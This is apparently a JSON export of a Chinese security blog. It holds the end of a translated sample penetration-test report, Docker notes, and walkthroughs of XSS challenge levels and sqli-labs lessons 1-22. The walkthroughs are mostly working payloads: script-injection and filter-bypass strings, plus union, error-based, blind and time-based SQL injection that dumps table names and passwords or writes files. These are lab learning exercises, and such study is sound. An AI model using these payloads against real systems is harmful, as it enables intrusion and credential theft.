施行常规漏洞评估。作为有效组织风险管理策略的一部分，漏洞评估要在常规部分执行。这有助于组织确定安全控制是否正确配置，操作是否如预期般执行，是否生成了想要的结果。参照NIST SP 800-30（http://csrc.nist.gov/publications/PubsDrafts.html#SP-800-30-Rev.%201）建立高效的风险管理系统。风险等级对MegaCorp One风险评定的结果为高。外部攻击者可以获得整个系统的控制权。有理由相信一个恶意的组织能够施行有效的目标攻击。 附录A：漏洞细节及减轻危害风险等级范围鉴于NIST SP 800-30，漏洞按照相似性及影响排列。默认的或弱的凭证级别：高描述：一个公共管理界面仅靠一个弱密钥保护。影响：仅靠暴力破解，就可能爆出SQLite Manager服务的管理员密码。因为缺少额外的授权凭证，这也可能爆出所有用户密码哈希值。如果密码会重用，那么爆出明文密码可以进一步攻击目标系统。修复：确保所有的管理界面受强密码或口令保护。避免使用普通的或和业务相关的密码，因为可以很容易通过字典生成。 密码重用级别：高描述：“mike“在SQLite Manager和个人计算机上用了相同的密码。影响：重复用相同的密码是一个非常差的习惯，应该尽量避免。这个漏洞的影响很恶劣，因为外部攻击者直接获得了内网计算机的有效凭证。这可能暴露更多的可攻击的界面。修复：升级密码管理策略，所有隔离服务强制使用复杂的，不同的密码。密码管理系统要使雇员方便的使用不同的密码进入不同的系统。 共享本地管理员密码级别：高描述：多台主机使用了相同的本地管理员密码。影响：MegaCorp One使用组策略来设置GPO内所有主机的本地管理员密码。结果，攻击者就可以利用著名的攻击工具“PASS-THE-HASH“来攻击，登录所有使用相同密码及相同密码哈希值的主机。如此，攻击者不用破译密码哈希值，大大增加了安全风险。修复：强烈建议禁止使用本地管理员账户。实在要用的话，应分配一个不同的名字及复杂随机的密码。 补丁管理级别：高描述：MegaCorp One内外部环境中有许多未打补丁的系统和程序。影响：弱授权机制和未打补丁的主机，都包含可以用爆破的漏洞，这会使得攻击者以未授权的方式得到大量的公司资产。特别地，例如SQLiite Manager包含远程执行代码的漏洞，底层主机也有一个本地提权的漏洞，这些可以使对外开放的主机轻易地被攻陷。表明了补丁管理策略以及强制执行的不足。修复：所有的公司资产都要及时打上供应商提供的补丁。要完成这些可以使用供应商官方工具或者第三方程序，这些都能检查出未应用的补丁。在许多例子中，第三方工具也可以用来在一个混乱的环境中进行补丁部署。 DNS区域传送级别：低描述：一个错误配置的DNS服务器允许无限制的区域传送。影响：一个配置成可与任何DNS服务器传输数据的DNS服务器，会泄露关于公司资产和网络布局等敏感信息。修复：DNS区域传送需仅对已证明的服务器开放。 默认APACHE文件目录级别：低描述：在admin.megacorpone.com主机上发现了默认的Apache文件目录。影响：攻击者通过检查默认文件夹可能猜出Apache服务器的版本。敏感信息也可能泄露。修复：移除公开网站的所有默认文件。 附录B:关于Offensive SecurityOffensive Security提倡黑盒渗透测试而反对白盒渗透测试。白盒渗透测试近几年来很火，因为在仅要实现常规需求的地方，简化了评估方法。其作为漏洞扫描方法，会有选择的确认发现的问题。这让服务供应商有能力扩大工作量，因为使用了自动化的工具，并且通过证书维持产品间的联动。黑盒是在受控环境下的攻击模拟形式，非常接近现实环境，组织会时不时的面临攻击。黑盒测试是基于目标的评估方法，不仅仅是发现一个简单的漏洞，而是提供一个漏洞真正的商业影响。黑盒测试会找到那些修复后能带来最高商业回报的区域。黑盒测试通常需要很高的专业知识。正如报告中显示的那样，Offensive Security坚信当进行黑盒测试时输出正确有效的结果是检验合格的唯一方式，因为我们专业的安全团队运用了很高专业知识。Offensive Security会集中力量进行渗透测试或着其他参与的项目。这意味着无论什么都参与到提供服务中，例如标准工具Kali Linux，畅销书的作者，O-day漏洞的发现者，或是如Exploit-DB的维护者。Offensive Security提供的产品与市场需求不配对。然而，我们不会适合任一工作。Offensive Security特别提供咨询服务，底容量和高质量的比例使得员工能更接近的模拟现实世界的攻击。这也允许在保持成本合理的同时，客户可以更多地获得行业认可的专业知识。例如，大批量/快速周转服务通常不适合我们。Offensive Security专注与领导高质量，高影响的评估活动，积极地寻求其他供应商无法提供服务的客户。请通过info@offsec.com联系我们。","categories":[],"tags":[{"name":"penetation test","slug":"penetation-test","permalink":"http://finsenty54.github.io/tags/penetation-test/"}]},{"title":"Docker学习笔记","slug":"Docker学习笔记","date":"2019-03-15T11:36:58.000Z","updated":"2019-11-19T06:16:47.752Z","comments":true,"path":"2019/03/15/Docker学习笔记/","link":"","permalink":"http://finsenty54.github.io/2019/03/15/Docker学习笔记/","excerpt":"sudo add-apt-repository \\ “deb [arch=amd64] https://download.docker.com/linux/ubuntu \\ $(lsb_release -cs) \\ stable” https://download.docker.com/linux/ubuntu/dists/bionic/pool/stable/amd64/","text":"sudo add-apt-repository \\ “deb [arch=amd64] https://download.docker.com/linux/ubuntu \\ $(lsb_release -cs) \\ stable” https://download.docker.com/linux/ubuntu/dists/bionic/pool/stable/amd64/ 配置完镜像源后，记得重启 /bin/sh/bin/bash运行shell docker run –name mysql-data -p 3306:3306 -v /home/finsenty/Documents/mysqldata:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=”123456” -d mysql:5.7 docker run -p 8888:5000 –name myfirstapp YOUR_USERNAME/myfirstapp Running on http://0.0.0.0:5000/ (Press CTRL+C to quit) docker rm docker ps -a -q docker rmi docker images -q docker run -p 4000:80 –name py-http6 –link mariadb:mysql finsenty/http5 mysql.connecter 查询后面带一个， -u “http://192.168.160.1/sqltest/post.php&quot; –forms docker run -d -p 4000:80 –link mysql:mysql –name http6 finsenty/http5 docker build -t finsenty/http5 .","categories":[],"tags":[]},{"title":"XSS 20关挑战","slug":"xss","date":"2019-03-01T14:22:42.000Z","updated":"2019-05-06T02:00:06.000Z","comments":true,"path":"2019/03/01/xss/","link":"","permalink":"http://finsenty54.github.io/2019/03/01/xss/","excerpt":"less1反射型XSS也被称为非持久性CSS当用户访问一个带有XSS代码的URL请求时，服务器端接收数据后处理，然后把带有XSS代码的数据发送到浏览器，浏览器解析这段带有XSS代码的数据后，最终造成XSS漏洞。 alert() 方法用于显示带有一条指定消息和一个 OK 按钮的警告框。 查看源码window.alert = function()echo &quot;&lt;h2 align=center&gt;欢迎用户&quot;.$str.&quot;&lt;/h2&gt;&quot;;没有过滤直接调用函数就可以通关&lt;script&gt;window.alert()&lt;/script&gt; &lt;script&gt; 标签用于定义客户端脚本，比如 JavaScript。","text":"less1反射型XSS也被称为非持久性CSS当用户访问一个带有XSS代码的URL请求时，服务器端接收数据后处理，然后把带有XSS代码的数据发送到浏览器，浏览器解析这段带有XSS代码的数据后，最终造成XSS漏洞。 alert() 方法用于显示带有一条指定消息和一个 OK 按钮的警告框。 查看源码window.alert = function()echo &quot;&lt;h2 align=center&gt;欢迎用户&quot;.$str.&quot;&lt;/h2&gt;&quot;;没有过滤直接调用函数就可以通关&lt;script&gt;window.alert()&lt;/script&gt; &lt;script&gt; 标签用于定义客户端脚本，比如 JavaScript。 less2利用页面元素看到输入在&lt;input name=keyword value=&quot;&#39;.$str.&#39;&quot;&gt;闭合input语句即可1&quot;&gt;&lt;script&gt;alert()&lt;/script&gt;1&quot;&gt;&lt;script&gt;alert()&lt;/script&gt;&lt;&quot; less3查看页面元素&lt;input name=keyword value=&#39;1&#39;&gt;在input语句里尝试闭合无用查看源码str都加上了htmlspecialchars函数，但默认配置是不过滤单引号的&#39;onmouseover=&#39;window.alert()即可 输入&#39; &lt;input name=&quot;keyword&quot; value=&quot;&quot; &#39;=&quot;&quot;&gt;输入&#39;&#39; &lt;input name=&quot;keyword&quot; value=&quot;&quot; &#39;&#39;=&quot;&quot;&gt;输入&#39;onclick&#39; &lt;input name=&quot;keyword&quot; value=&quot;&quot; onclick&#39;&#39;=&quot;&quot;&gt;输入onclick= &lt;input name=&quot;keyword&quot; value=&quot;&quot; onclick=&quot;&quot;&gt; less4输入&quot;&gt;&lt;script&gt;alert()&lt;/script&gt;&lt;&quot;查看可知&lt;input name=&quot;keyword&quot; value=&quot;&quot; scriptalert()=&quot;&quot; script&quot;&quot;=&quot;&quot;&gt;过滤了&lt; &gt;利用上节方法&quot;onclick=&quot;alert() 更新于2019-03-03 11:19:50 星期日 less5试过后发现onclick变为o_nclickscript变为sc_ript使用&quot;&gt;&lt;a href=&quot;javascript:alert()&quot;&gt; less6onclick script href输入后都进行了变化&quot;&gt;&lt;a HRef=&quot;javascript:alert()&quot;&gt;keyword=&quot;ONclick=&quot;alert()keyword=&quot;&gt;&lt;scriPt&gt;alert()&lt;/SCRIpt&gt;&lt;&quot;keyword=&quot;&gt;&lt;a HreF=javascript:alert()&gt;213&lt;/a&gt;&quot;&lt;进行大小写替换可以 less7script被过滤，改变大小写也没有用on被过滤href同样如此keyword=&quot;&gt;&lt;scriscriptpt&gt;alert()&lt;/scrscriptipt&gt;&lt;&quot;利用双写绕过 更新于2019-03-06 21:20:39 星期三 less8这题可以添加链接直接使用javascript:alert(1)但并没有用，查看源码$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);被替换了使用制表符绕过%09keyword=javasc%09ript%3Aalert%281%29&amp;submit=添加友情链接 less9上题结果没有用，查看源码if(false===strpos($str7,&#39;http://&#39;))知一定要有http://在javascript伪协议里面，属于js范畴，所以单行注释符是可以使用的javasc%09ript%3Aalert%281%29//http://www.test.com less10查看页面元素有几个隐藏的值，注入点就在这keyword=test&amp;t_sort=&quot; type=&quot;text&quot; onclick=&quot;alert() 更新于2019-03-27 18:15:42 星期三","categories":[],"tags":[{"name":"xss","slug":"xss","permalink":"http://finsenty54.github.io/tags/xss/"}]},{"title":"sqli-labs(less-1__less-22)","slug":"sqli-labs","date":"2019-02-26T09:01:08.000Z","updated":"2019-05-06T01:54:52.000Z","comments":true,"path":"2019/02/26/sqli-labs/","link":"","permalink":"http://finsenty54.github.io/2019/02/26/sqli-labs/","excerpt":"闭合有&#39; &quot; ) 单双引号不能同时存在，) 可有多个 Less-1 single 单个的quote 引号变量前面加 ?information_schema.tablesinformation_schema.columnsinformation_schema.schemata 在Less-1里的index.php中添加 echo $sql; 可在网页中显示查询代码，echo &quot;&lt;br&gt;&quot;; 表示换行","text":"闭合有&#39; &quot; ) 单双引号不能同时存在，) 可有多个 Less-1 single 单个的quote 引号变量前面加 ?information_schema.tablesinformation_schema.columnsinformation_schema.schemata 在Less-1里的index.php中添加 echo $sql; 可在网页中显示查询代码，echo &quot;&lt;br&gt;&quot;; 表示换行 ?id=1&#39; and 1=1 --+ 没有报错，返回正确结果 ?id=10&#39; 报错 You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#39;&#39;10&#39;&#39; LIMIT 0,1&#39; at line 1 ?id=1&#39; and 1=2 --+ 没有正确结果经过这三个步骤说明是字符型注入 使用order by来判断有几个字段?id=1&#39; order by 4--+报错Unknown column &#39;4&#39; in &#39;order clause&#39;说明有3个字段 LIMIT 0,1 表示结果只显示一行?id=-1&#39; union select 1,2,3 --+ 看哪个字段可以回显 ?id=1&#39; union select 1,concat_ws(&#39;_&#39;,version(),user(),database()),@@basedir --+得到版本，用户，当前数据库，数据路径concat_ws 带分隔符的链接 ?id=-1&#39; union select 1, group_concat(table_name),3 from information_schema.tables where table_schema = database() --+得到当前库的表名?id=-1&#39; union select 1,(select group_concat(schema_name) from information_schema.schemata) ,3 --+查看数据库名信息group_concat 行转列 ?id=-1 &#39; union select 1, (select group_concat(column_name) from information_schema.columns where table_name=&quot;users&quot;), 3 --+users 表的列名 ?id=-1 &#39; union select 1,(select group_concat(password) from users) ,3 --+得出账户密码 Less-2 ?id=1&#39;报错 ?id=1 and 1=1正确 ?id=1 and 1=2错误可知是数字型注入解题与第一题类似，不再赘述 Less-3查看源码可知，用()加在了id两边，所以只要将()闭合就行了?id=-1&#39;) union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3--+?id=-1&#39;) union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&quot;users&quot;),3--+?id=-1&#39;) union select 1,(select group_concat(password) from users),3--+ Less-4查看源码，id两边加了”,用?id=-1&quot;)闭合 Less-5双注入 Rand() //随机函数 Floor() //取整函数 Count() //汇总函数 Group by clause //分组语句 https://blog.csdn.net/Leep0rt/article/details/78556440 ?id=1&#39; union select count(*),1,concat((select database()), &#39;_&#39;,floor(rand()*2)) as a from information_schema.columns group by a--+select 查询列数要相同，否则报错 ?id=1&#39; union select count(*),1,concat((select password from users limit 5,1), &#39;_&#39;,floor(rand()*2)) as a from information_schema.columns group by a--+用group_concat会报错，使用limit 更新于2019-03-01 22:21:15 星期五 Less-6尝试注入后可知是用&quot;闭合，字符串型其他和上题一致?id=1&quot; union select count(*),concat( (select user()),&#39;_&#39;,floor(rand()*2) ) as a,3 from information_schema.schemata group by a --+ ?id=1&quot; union select count(*),concat( (select table_name from information_schema.tables where table_schema=database() limit 3,1 ),&#39;_&#39;,floor(rand()*2) ) as a,3 from information_schema.schemata group by a --+ ?id=1&quot; union select count(*),concat( (select column_name from information_schema.columns where table_name=&quot;users&quot; limit 5,1 ),&#39;_&#39;,floor(rand()*2) ) as a,3 from information_schema.schemata group by a --+ ?id=1&quot; union select count(*),concat( (select password from users limit 0,1 ),&#39;_&#39;,floor(rand()*2) ) as a,3 from information_schema.schemata group by a --+ 更新于2019-03-03 11:48:51 星期日 Lss-7利用outfile文件一般在Sql查询语句中，想要正常查询到信息，只能在最里层有引号，外层全是小括号。即已知注入类型后依次增加括号数必能分析出括号数（存在注入点）。数据库的file权限规定了数据库用户是否有权限向操作系统内写入和读取已存在的权限需要在指定的目录下进行数据的导出。需要注意的是利用数据库file权限向操作系统写入文件时， 对于相同文件名的文件不能覆盖 secure_file_priv这个参数用来限制数据导入和导出操作的效果，例如执行load data、into outfile语句和load_file()函数,这些操作需要用户具有file权限。 如果这个参数为空，这个变量没有效果。 如果这个参数设为一个目录名，Mysql服务只允许在这个目录中执行文件的导入和导出操作。这个目录必须存在，MySQL服务不会创建它. 如果这个参数为null，Mysql服务会禁止导入和导出操作。这个参数在MySQL 5.7.6版本引入。 @@datadir 读取数据库路径@@basedir MYSQL 获取安装路径 在Mysql中，需要注意路径转义的问题，即用\\分隔。 https://www.jianshu.com/p/7b9256de20d1 经过测试，用&#39;)) 来闭合 ?id=1&#39;)) union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=database()) into outfile &quot;C:\\\\xampp\\\\mysql\\\\data\\\\security\\\\4.txt&quot; --+ ?id=1&#39;)) union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name=&quot;users&quot;) into outfile &quot;C:\\\\xampp\\\\mysql\\\\data\\\\security\\\\5.txt&quot; --+ ?id=1&#39;)) union select 1,2,(select group_concat(password) from users) into outfile &quot;C:\\\\xampp\\\\mysql\\\\data\\\\security\\\\6.txt&quot; --+ Less-8盲注布尔注入当一个页面，存在注入，没显示位，没有数据库出错信息，只能通过页面返回正常不正常进行判断进行sql注入。 exists（）用于检查 子查询是否有返回数据。 结果是 ture或者false ascii（）把字符转化成ascii码 substr（）substr（string string，num start，num length）；偏移从1开始的 并不是0； DISTINCT 去重复?id=1&#39; and (select ascii(substr( (select database()) ,1,1))&gt;115) --+ ?id=1&#39; and ((select count(distinct+table_schema) from information_schema.tables)&gt;6)--+ ?id=1&#39; and (select ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;101)--+ ?id=1&#39; and (select ascii(substr( (select column_name from information_schema.columns where table_name=&quot;users&quot; limit 0,1) ,1,1))&gt;11) --+ ?id=1&#39; and (select ascii(substr( (select password from users limit 0,1) ,1,1))&gt;68) --+ select database() 作为一个语句加括号用脚本来跑 更新于2019-03-04 23:09:10 星期一 Less-9盲注基于时间if( expr1 , expr2 , expr3 ) expr1 true 返回expr2 false 返回 expr3 ?id=1&#39; and if((select ascii(substr(database(),1,1)))=115,sleep(5),1) --+ 利用页面返回时间判断对错例如?id=1&#39; and if((select ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))=101,sleep(5),1) --+ Less-10与上题相同，不过利用&quot;进行闭合 更新于2019-03-06 20:29:31 星期三 Less-11GET - 从指定的资源请求数据。 POST - 向指定的资源提交要被处理的数据 输入&#39;报错，知用&#39;闭合uname=&#39; or &#39;1&#39;=&#39;1&amp;passwd=&#39; or &#39;1&#39;=&#39;1&amp;submit=Submit可以直接爆出来其他相同uname=&#39; or &#39;1&#39;=&#39;1&amp;passwd=&#39; union select 1,2#&amp;submit=Submit Less-12实验可知用&quot;)闭合其他相同 Less-13实验知用&#39;) 闭合其他相同，例如 uname=1&amp;passwd=1&#39;) and extractvalue(1,concat(0x7e,(database()))) #&amp;submit=Submit uname=1&amp;passwd=1&#39;) and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1))) #&amp;submit=Submit Less-14实验知用&quot;闭合其他和上题相同 Less-15实验知用&#39;闭合但没用报错信息所以使用时间或布尔注入uname=&#39; or if(ascii(substr(database(),1,1))=115,sleep(0.5),1) #&amp;passwd=1&amp;submit=Submit Less-16实验知用&quot;闭合其他和上题相同 Less-17在uname中注入，都没有反应在password中注入，也没有反应后知先验证用户名正确后，才执行password updatexml()uname=admin&amp;passwd=1&#39; or updatexml(1,concat(0x7e,version(),0x7e),1)# &amp;submit=Submit uname=admin&amp;passwd=1&#39; or updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),1)# &amp;submit=Submit 其他相同 Less-18使用正确账号密码后，页面显示user-agent，则可以在这上面注入 1&#39; and extractvalue(1,concat(0x7e,(select user()),0x7e)) and &#39;1&#39;=&#39;11&#39; and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 1,1),0x7e)) and &#39;1&#39;=&#39;1其他相同HTTP 请求头中除了 User-Agent可能存在sql注入意外，还有referer、X-Forwarded-For可能存在sql注入。 更新于2019-03-10 22:43:03 星期日 Less-19参考上题输入正确用户和密码后，跳出页面 差不多知道在referer上注入&#39; and (extractvalue(1,concat(0x7e,(select version()),0x7e)) ) and &#39;1&#39;=&#39;1不能用#注释，因为后面还有语句存在 &#39; and (extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&quot;users&quot; limit 0,1),0x7e)) ) and &#39;1&#39;=&#39;1 更新于2019-03-10 22:43:03 星期日 Less-20由题目知注入点在Cookie中 这里我犯了个错误，由于没有拦截，修改Cookie后，直接点刷新不会出结果，需要重新载入页面 输入&#39;报错存在注入点 接下来可以用第一题用的&#39; union select 1,2,database()# &#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema =database()# 也可以用报错注入&#39; and extractvalue(1,concat(0x7e,(select database()),0x7e))# Less-21查看CookieYWRtaW4进行解密，知是用base64加密的admin所以只要将上题内容加密即可 Less-22查看cookieadmin&#39; and 1=1 #没有查询结果admin&quot; and 1=1 #结果正确知是用&quot;闭合其他方法与前题相同 更新于2019-03-13 20:26:48 星期三","categories":[],"tags":[{"name":"sql","slug":"sql","permalink":"http://finsenty54.github.io/tags/sql/"}]}]}